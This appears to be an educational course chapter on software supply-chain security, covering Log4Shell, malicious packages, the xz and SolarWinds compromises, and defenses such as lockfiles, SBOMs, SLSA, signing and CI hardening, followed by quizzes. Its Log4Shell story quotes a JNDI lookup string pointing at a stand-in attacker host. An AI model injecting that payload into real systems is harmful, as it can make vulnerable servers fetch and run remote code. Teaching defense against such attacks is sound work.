---
title: Supply-Chain Security — Trusting the Code You Didn't Write
summary: Why most of your application is other people's code, and how attackers exploit that — vulnerable dependencies (Log4Shell), malicious packages and typosquatting, compromised maintainers (xz), build-system attacks (SolarWinds) — and the defenses: lockfiles, scanning, SBOMs, signed artifacts, SLSA, and hardened CI pipelines.
---

## 90% of your code isn't yours

> [!STORY] On 9 December 2021, a vulnerability was published in **Log4j**, a small Java logging library. If an application logged a string like `${jndi:ldap://attacker.example/x}` — say, a username or a browser's User-Agent header — Log4j would fetch and run code from the attacker's server. Log4j was inside a huge share of the world's Java software: game servers, cloud services, enterprise products, devices. Most companies didn't even know which of their systems contained it, because it was a dependency of a dependency of a dependency. Security teams worked through the holidays just to find out where it was. This was **Log4Shell**, and it made "software supply chain" a phrase every engineer knows.

A typical web application has a few thousand lines of its own code and **hundreds or thousands** of open-source packages. Each package, its maintainers, the registry that hosts it, and the build system that assembles it are all links in your **supply chain** — and attackers target the weakest one.

## Four kinds of supply-chain attack

::widget Stepper {"type":"flow","cols":4,"title":"How attackers get into the software supply chain","what":"The path from source code to a running app, and the real attack at each stage. Every arrow is a place where trust is assumed.","steps":["Press Play from left to right.","For each stage, read the real incident.","Decide which defenses in this chapter protect each stage."],"nodes":[["Vulnerable dependency","A genuine bug in a popular library. Log4Shell (2021): logging an attacker's string ran their code. Defense: know what you depend on (SBOMs) and patch fast."],["Malicious package","Fake packages with names like 'reqeusts' (typosquatting), or internal package names published publicly so the build fetches the attacker's version (dependency confusion, 2021). Defense: lockfiles, scoped/private registries, reviews of new dependencies."],["Compromised maintainer","An attacker gains a maintainer's trust or account. xz (2024): a backdoor slipped in over two years of patient contributions. event-stream (2018): a new 'helpful' maintainer added code stealing cryptocurrency wallets."],["Compromised build","The source is clean, but the build system is hacked. SolarWinds (2020): attackers modified the build to insert a backdoor into signed updates sent to ~18,000 customers, including government agencies. Defense: hardened, isolated builds with provenance."]]}

> [!ANALOGY] A restaurant can have a spotless kitchen and still poison its customers if a supplier's lettuce is contaminated. Good restaurants know every supplier, check deliveries, keep records of which batch went into which dish, and can recall quickly when a supplier reports a problem. Supply-chain security is the same discipline for code.

## Know what you're running

### Lockfiles and pinning

A **lockfile** (`package-lock.json`, `poetry.lock`, `go.sum`, `Cargo.lock`) records the **exact** version — and a cryptographic hash — of every dependency, direct and indirect. Builds become reproducible, and a tampered package fails the hash check.

```bash
npm ci                      # install exactly what the lockfile says; fail if it doesn't match
pip install --require-hashes -r requirements.txt
```

Pin container base images by **digest** (`python:3.12-slim@sha256:…`), not just a tag that can move.

### SBOMs: an ingredient list

A **software bill of materials** lists every component in a build, with versions — in standard formats (CycloneDX, SPDX), generated automatically (Syft, Trivy, build plugins). When the next Log4Shell happens, "are we affected and where?" becomes a search instead of a two-week scramble. Many governments and large customers now require them.

### Vulnerability scanning

- **Dependency scanners** (Dependabot, Renovate, Snyk, `npm audit`, OSV-Scanner, Trivy for images) compare your dependencies against vulnerability databases and open upgrade pull requests.
- **Prioritize** by real risk: is the vulnerable function actually reachable? Is the service internet-facing? Is there a known exploit (the CISA KEV catalog)? An unreachable "critical" in a test-only dependency matters less than a "medium" in your login path.
- Keep dependencies **current** continuously; upgrading three years of versions in an emergency is when things break.

## Choose dependencies carefully

Before adding a package, ask:

- Do I need it? (A 10-line function doesn't need a dependency — remember `left-pad`, a 17-line package whose removal in 2016 broke builds across the internet.)
- Is it maintained? How many maintainers? How quickly are security issues fixed?
- How many dependencies does **it** pull in?
- What does it do at install time? npm and PyPI packages can run **install scripts** — a favorite malware trick. Consider `npm ci --ignore-scripts` where possible.

Tools like **OpenSSF Scorecard** and deps.dev summarize a project's security practices.

## Protect your own registry and names

- Use **scoped names** and configure package managers so internal packages can **only** come from your private registry — this blocks dependency confusion.
- Proxy public registries through an internal mirror (Artifactory, Nexus, cloud artifact registries) that can block known-bad packages and keeps builds working if the public registry is down.
- Enable 2FA and trusted publishing for packages you publish.

## Harden the build: SLSA and signing

**SLSA** ("salsa", Supply-chain Levels for Software Artifacts) is a framework of increasingly strong build guarantees:

- Builds run on a **hosted, isolated** build service, not a developer's laptop.
- Each build produces **provenance**: a signed statement of what source commit, what build steps and what builder produced the artifact.
- Builds are **ephemeral** and can't be influenced by other builds or by individual people.

**Sign** what you build — container images and release files — and **verify signatures at deploy time** (Sigstore's cosign, with keyless signing tied to your CI's identity). Then a Kubernetes admission policy can refuse to run any image your pipeline didn't produce — which would have defeated a SolarWinds-style tampering after the build.

### CI/CD is a high-value target

Your pipeline can deploy to production, so attackers want it:

- Give CI jobs **minimal permissions**; use short-lived cloud credentials via OIDC instead of stored keys.
- **Pin third-party CI actions by commit hash**, not a version tag that its owner (or an attacker who compromises them) can move. (In 2025, a popular GitHub Action, `tj-actions/changed-files`, was compromised, and its tags were pointed at code that dumped secrets into build logs.)
- Don't run untrusted pull-request code with access to secrets.
- Require review for changes to pipeline definitions; protect the main branch.

> [!EXAMPLE] **A hardened pipeline, end to end.** Dependencies install from a lockfile via the internal mirror; scanners and secret detection run on every pull request; the build runs on ephemeral runners with no long-lived keys; it outputs a container image, an SBOM and signed provenance; cosign signs the image; and the cluster's admission controller only runs signed images built from the main branch. Each step closes off one stage of the attacks above.

> [!RECAP]
> - Most of your code is **dependencies**; attackers target vulnerable libraries (Log4Shell), malicious packages (typosquatting, dependency confusion), maintainers (xz) and builds (SolarWinds).
> - **Lockfiles with hashes**, pinned image digests, and an **SBOM** for every build.
> - **Scan** continuously and prioritize by reachability and exploitation; keep dependencies current.
> - Vet new dependencies; use **private registries/mirrors** and scoped names.
> - Harden builds with **SLSA** practices, **sign** artifacts and **verify** at deploy; give CI minimal, short-lived permissions and pin actions by hash.

> [!INTERVIEW] Expect questions on Log4Shell or xz as examples, how you'd find whether you're affected by a new vulnerability (SBOMs), dependency confusion, and how to secure a CI/CD pipeline.

::quiz {"q":"What is dependency confusion?","options":["Using two versions of a library","Publishing a public package with the same name as a company's internal one, so builds fetch the attacker's version","A bug in npm","Circular dependencies"],"answer":1,"explain":"Fix it by forcing internal names to resolve only from your private registry."}

::quiz {"q":"How does an SBOM help when a new critical vulnerability is announced?","options":["It patches the vulnerability","It lists every component in each build, so you can quickly find which systems are affected","It blocks attackers","It replaces scanning"],"answer":1,"explain":"It turns a scramble into a search."}

::quiz {"q":"Why pin third-party CI actions by commit hash rather than a tag?","options":["Hashes run faster","Tags can be moved to different (possibly malicious) code; a commit hash can't change","Tags are deprecated","For readability"],"answer":1,"explain":"Exactly what happened in the tj-actions compromise."}
